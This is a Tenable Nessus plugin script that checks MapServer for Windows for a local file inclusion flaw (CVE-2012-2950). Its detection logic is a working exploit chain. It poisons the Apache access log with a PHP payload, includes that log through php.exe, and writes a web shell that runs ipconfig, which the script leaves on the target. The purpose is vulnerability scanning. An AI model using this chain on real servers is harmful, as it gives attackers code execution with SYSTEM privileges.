#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62788);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2012-2950");
  script_bugtraq_id(53737);
  script_osvdb_id(82436);

  script_name(english:"MapServer for Windows (MS4W) Bundled Apache / PHP Configuration Local File Inclusion");
  script_summary(english:"Tries to read a file remotely and execute code");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a local file inclusion
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The MapServer for Windows installation on the remote host is affected
by a local file inclusion vulnerability due to an error in the bundled
Apache and PHP configurations.  Successful exploitation may allow an
attacker to view arbitrary files on the remote host or allow the
execution of arbitrary PHP code with SYSTEM privileges.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2012/May/142");
  script_set_attribute(attribute:"see_also", value:"http://www.maptools.org/ms4w/index.phtml?page=HISTORY.txt");
  script_set_attribute(attribute:"solution", value:"Update to version 3.0.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:maptools:ms4w");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("mapserver_ms4w_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ms4w");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname      : "ms4w",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
loc = build_url(port:port, qs:dir + "/");

attack_file = SCRIPT_NAME - ".nasl" + "-" + unixtime() + ".php";

payload = "<?php $handle = fopen('../htdocs/"+attack_file+"', 'w'); $data='<?php system(ipconfig);?>'; fwrite($handle, $data);?>";

# Send our payload to store in access.log
res = http_send_recv3(
  method       : "HEAD",
  port         : port,
  item         : payload + dir + "/",
  exit_on_fail : TRUE
);
head_req = http_last_sent_request();

# Get path to Apache logs from phpinfo included with MS4W
res2 = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : dir + "/phpinfo.php",
  exit_on_fail : TRUE
);

if ("<title>phpinfo()</title>" >< res2[2])
{
  matches = egrep(pattern:">DOCUMENT_ROOT", string:res2[2]);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:'class="v">(.+) </td></tr>', string:match);
      if (!isnull(item))
      {
        path = item[1];
        break;
      }
    }
  }
}
if(isnull(path)) exit(0,"Unable to obtain path to access.log file for MapServer for Windows on port " + port + ".");

# Execute our attack by making a GET request to access.log
path = str_replace(string:path, find:'/', replace:'\\');
path = path - "htdocs";

res3 = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : dir + "/cgi-bin/php.exe?-f" + path + "logs\access.log",
  exit_on_fail : TRUE
);
log_req = http_last_sent_request();

# Attempt to access the file we created with the attack
res4 = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : dir + "/" + attack_file,
  exit_on_fail : TRUE
);

output = res4[2];
get_up_path = path + 'htdocs\\' + attack_file;

if (egrep(pattern:"Windows IP Configuration", string:output))
{
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists by creating and then' +
      '\nrequesting the following web page : ' +
      '\n' +
      '\n' + loc + attack_file +
      '\n' +
      '\nNote: This file has not been removed by Nessus and will need to be' +
      '\nmanually deleted (' + get_up_path + ').' +
      '\n';

    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n' +
        '\n' + 'This file was created using the following pair of requests :' +
        '\n' +
        '\n' + head_req + '\n' + log_req +
        '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "MapServer for Windows", loc);
